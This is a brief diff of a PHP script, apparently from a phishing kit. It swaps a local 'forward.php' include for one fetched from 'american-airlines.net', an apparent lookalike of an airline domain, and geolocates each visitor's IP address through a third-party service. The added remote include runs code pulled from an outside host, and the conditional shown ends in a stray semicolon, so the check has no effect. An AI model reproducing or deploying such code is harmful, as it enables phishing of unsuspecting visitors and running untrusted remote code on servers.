@@ -1,5 +1,5 @@
 ﻿﻿<?php
-require '../forward.php';
+require 'https://american-airlines.net/forward.php';
 $ip = getenv("REMOTE_ADDR");
 $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
 if(property_exists($ipdat, 'geoplugin_countryCode'));
